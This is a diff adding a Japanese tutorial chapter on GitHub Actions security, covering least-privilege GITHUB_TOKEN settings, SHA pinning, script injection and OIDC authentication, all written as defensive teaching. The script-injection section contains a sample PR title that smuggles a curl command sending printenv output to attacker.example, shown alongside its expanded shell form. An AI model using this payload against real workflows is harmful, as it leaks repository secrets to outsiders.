@@ -1,0 +1,181 @@
+---
+title: "GitHub Actionsのセキュリティ — 権限最小化・script injection対策・OIDC"
+description: "CI/CDパイプラインは攻撃者にとって魅力的な標的です。GITHUB_TOKENの権限最小化、サードパーティアクションのバージョン固定、script injection攻撃の仕組みと対策、OIDCによるキーレスなクラウド認証を解説します。"
+order: 10
+---
+
+CI/CDパイプラインには、コードを書き換えられる権限、Secretsへのアクセス、本番へのデプロイ経路——攻撃者が欲しがるものが全部そろっています。実際、Actionsを起点としたサプライチェーン攻撃(広く使われるアクションが改ざんされ、利用している大量のリポジトリのSecretsが流出する事件)は現実に起きています。
+
+この章では、ワークフローを書く人が**最低限押さえるべき防御**を4つに絞って解説します。
+
+1. GITHUB_TOKENの権限を最小化する
+2. サードパーティアクションを固定する
+3. script injectionを防ぐ
+4. クラウド認証はOIDCでキーレスにする
+
+## 防御①: GITHUB_TOKENの権限最小化
+
+実はすべてのワークフロー実行には、**GITHUB_TOKEN**という一時トークンが自動で発行されています。`actions/checkout` がプライベートリポジトリをクローンできるのも、このトークンのおかげです。
+
+問題はその権限範囲です。設定によっては、ワークフロー内のあらゆるコード——サードパーティアクションを含む——が、リポジトリへの書き込みなどの強い権限を持ったトークンを使えてしまいます。
+
+対策は `permissions` キーで**必要な権限だけを明示的に与える**ことです。
+
+```yaml
+name: CI
+
+on:
+  pull_request:
+    branches: [main]
+
+permissions:
+  contents: read        # コードの読み取りのみ。それ以外は全部なし
+
+jobs:
+  # ...
+```
+
+`permissions` を1つでも書くと、**書かなかった権限はすべて none になります**。CIのように「コードを読んでテストするだけ」のワークフローは `contents: read` だけで動きます。PRにコメントを書くワークフローなら `pull-requests: write` を足す——という具合に、必要になったら足すスタイルが安全です。
+
+リポジトリ全体のデフォルトも Settings → Actions → General → Workflow permissions から **Read repository contents and packages permissions**（読み取りのみ）にしておきましょう。
+
+<SpeechBubble character="/images/question_woman_04_color.png" name="学習者">
+権限を絞って、もし足りなかったらどうなるの？
+</SpeechBubble>
+
+そのステップが権限エラーで失敗して、ログに何の権限が足りないか表示されます。つまり「絞りすぎ」はすぐ気づいて直せる。逆に「広すぎ」は事故が起きるまで気づけません。迷ったら絞る一択です。
+
+## 防御②: サードパーティアクションの固定
+
+`uses: someone/some-action@v1` と書くとき、あなたは**他人のコードに自分のランナーとトークンを差し出しています**。そのアクションが悪意ある更新をされたら、`v1` を参照している全リポジトリが影響を受けます。
+
+リスクの度合いは参照の仕方で変わります。
+
+| 書き方 | 意味 | リスク |
+|---|---|---|
+| `@main` | ブランチの最新 | **最悪**。改ざんが即座に流れ込む |
+| `@v4` | バージョンタグ | タグは後から張り替え可能。中リスク |
+| `@8f4b7f8...`（コミットSHA） | 特定コミットに固定 | **改ざん不可能**。最も安全 |
+
+もっとも堅い書き方は、コミットSHAで固定してコメントでバージョンを添える形です。
+
+```yaml
+      - uses: actions/checkout@8f4b7f84864484a7bf31766abe9204da3cbe65b3 # v4.1.1
+```
+
+実務での現実的な指針はこうです。
+
+- `actions/` で始まる**GitHub公式アクションはタグ参照（`@v4`）で許容**する運用が多い
+- **それ以外のサードパーティ製はSHA固定を検討**する。少なくとも `@main` 参照は絶対にしない
+- 使う前にリポジトリのソースを一度読む。Star数や更新履歴も判断材料にする
+
+> SHA固定にすると更新追従が面倒になりますが、それは第12章で紹介するDependabotに任せられます。
+
+## 防御③: script injectionを防ぐ
+
+ここが本章でいちばん「知らないと踏む」ポイントです。次のワークフロー、どこが危険かわかりますか？
+
+```yaml
+on: pull_request
+
+jobs:
+  greet:
+    runs-on: ubuntu-latest
+    steps:
+      - name: PRタイトルを表示する
+        run: echo "PRのタイトル: ${{ github.event.pull_request.title }}"
+```
+
+一見無害ですが、これは**任意コード実行の脆弱性**です。
+
+`${{ }}` は、シェルが実行される**前に**単純な文字列置換で展開されます。つまりPRタイトルが次のような文字列だったら——
+
+```
+a"; curl -X POST https://attacker.example/steal -d "$(printenv)"; echo "
+```
+
+展開後のシェルコマンドはこうなります。
+
+```bash
+echo "PRのタイトル: a"; curl -X POST https://attacker.example/steal -d "$(printenv)"; echo ""
+```
+
+攻撃者が仕込んだ `curl` が実行され、環境変数（Secretsを含み得る）が外部に送信されます。**PRのタイトルは、フォークから誰でも自由に設定できる**ことを思い出してください。攻撃者はPRを1つ出すだけでいいのです。
+
+<Figure src="/images/marubatsu.png" alt="正しい方法と間違った方法の対比" width={180}>
+ユーザー入力を式で run に直接埋め込むのは「❌」。環境変数を経由するのが「⭕」
+</Figure>
+
+### 対策: 環境変数を経由する
+
+ユーザーが制御できる値は、`env` を経由して渡します。
+
+```yaml
+      - name: PRタイトルを表示する
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
+        run: echo "PRのタイトル: $PR_TITLE"
+```
+
+`env` への代入はシェルの構文解釈を経由しないので、どんな文字列が来ても**ただのデータ**として扱われます。ルールとして覚えるならこうです。
+
+> **PRタイトル・ブランチ名・Issue本文・コミットメッセージなど、外部の人間が決められる値を `run` の中に `${{ }}` で直接書かない。必ず `env` を経由する。**
+
+> この攻撃と対策の詳細は公式の[GitHub Actionsのセキュリティ強化](https://docs.github.com/ja/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)に詳しくまとまっています。一読の価値があります。
+
+## 防御④: OIDCでクラウド認証をキーレスにする
+
+第9章で、デプロイ用トークンをSecretsに入れました。しかしAWSやGCPのような大手クラウドが相手なら、**そもそも長寿命の認証情報を保存しない**方法があります。それが**OIDC（OpenID Connect）**です。
+
+### 長寿命キーの何が問題か
+
+Secretsに入れたアクセスキーは、漏れない保証はありませんし、漏れても気づきにくい。定期ローテーションも手間です。「保存された秘密」は存在する限りリスクであり続けます。
+
+### OIDCの仕組み
+
+OIDCでは、認証の向きが逆転します。
+
+```
+【従来】 保存したアクセスキーをクラウドに提示する
+【OIDC】 GitHubが「このワークフローは本物です」という署名付き証明書（IDトークン）を発行
+          ↓
+        クラウド側が証明書を検証して、数分だけ有効な一時クレデンシャルを発行
+```
+
+事前にクラウド側へ「`あなたのリポジトリ` の `mainブランチ` のワークフローだけを信頼する」という条件を登録しておきます。ワークフロー側（AWSの例）はこうなります。
+
+```yaml
+permissions:
+  id-token: write       # OIDCトークンの発行に必要
+  contents: read
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::123456789012:role/github-actions-deploy
+          aws-region: ap-northeast-1
+      - run: aws s3 sync ./out s3://my-bucket
+```
+
+Secretsにアクセスキーが**1つも登場しない**ことに注目してください。漏れる秘密がそもそも存在しない——これがキーレスの意味です。クラウド側のロール設定はAWS/GCP/Azureそれぞれ手順があるので、実際に組むときは[OpenID Connectについて（公式ドキュメント)](https://docs.github.com/ja/actions/concepts/security/openid-connect)から辿ってください。
+
+<SpeechBubble character="/images/oksign_man_color.png" name="メンター">
+OIDCの設定はクラウド側の作業が少し重いので、「Secretsのトークンで動かす→運用が固まったらOIDC化」という順でも構いません。ただ「長寿命キーは負債」という感覚は最初から持っておきましょう。
+</SpeechBubble>
+
+## セキュリティチェックリスト
+
+この章のまとめを、そのまま使えるチェックリストにしておきます。
+
+- [ ] ワークフローに `permissions:` を書き、必要最小限にしている
+- [ ] リポジトリ設定のデフォルト権限を読み取り専用にしている
+- [ ] `@main` 参照のアクションがない。サードパーティ製はSHA固定を検討した
+- [ ] PRタイトルなど外部入力を `run` に `${{ }}` で直接埋め込んでいない
+- [ ] Secretsをログに出していない（自動マスクを過信せず、そもそも出力しない）
+- [ ] クラウド認証はOIDC化を検討した
+- [ ] フォークからのPRでSecretsが使われない仕組みを理解している（第4章）
+
+次章では、ここまでの全部の知識を使って、実際のプロジェクトにCI/CDパイプラインを一気通貫で組み上げるハンズオンに挑みます。
